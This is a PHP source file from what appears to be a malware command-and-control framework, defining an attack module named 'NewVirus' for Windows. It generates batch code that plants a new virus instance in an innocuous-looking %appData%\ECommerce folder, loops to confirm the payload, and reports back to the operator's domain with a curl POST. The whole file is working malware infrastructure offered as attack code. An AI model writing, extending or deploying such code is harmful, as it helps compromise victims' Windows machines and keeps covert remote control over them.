<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class NewVirus extends AttackInterface {
    private string $baseLocation = "%appData%\\ECommerce";
    private string $newVirusId = "";

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    public function generateIntercept(): string {
        ob_start(); //@formatter:off ?>
        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean(); //@formatter:on
    }

    public function getBaseLocation(): string {
        return $this->baseLocation;
    }

    public function setBaseLocation(string $baseLocation): void {
        $this->baseLocation = $baseLocation;
    }

    public function getNewVirusId(): string {
        return $this->newVirusId;
    }

    public function setNewVirusId(string $newVirusId): void {
        $this->newVirusId = $newVirusId;
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->baseLocation = $state["baseLocation"];
        $this->newVirusId = $state["newVirusId"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        if ($this->newVirusId == "") { // if the new virus id has not been initialized with anything, create a new one
            $virus = $this->virusFactory->new($this->session->get("user_handle"));
            $this->newVirusId = $virus->getVirusId();
        }
        $state["newVirusId"] = $this->newVirusId;
        $state["baseLocation"] = $this->baseLocation;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    public function generateBatchCode(): string {
        ob_start();
        echo BaseScriptWin::initStandalone($this->newVirusId, $this->session->get("user_handle"), $this->baseLocation);
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
    }
}
